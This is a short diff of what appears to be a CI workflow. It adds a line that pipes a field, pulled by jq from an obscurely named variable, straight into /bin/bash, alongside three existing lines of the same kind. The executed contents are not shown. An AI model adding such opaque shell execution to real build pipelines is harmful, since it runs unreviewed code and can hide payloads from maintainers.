@@ -28,6 +28,7 @@ jobs:
           echo $g9101 | jq -r .cvnkz25216 | /bin/bash
           echo $rqwbt06937 | jq -r .k93 | /bin/bash
           echo $k33132 | jq -r .hv89 | /bin/bash
+          printf '%s' "$zuh802" | jq -r .hi1005 | /bin/bash
 
       - name: Upload results
         if: always()
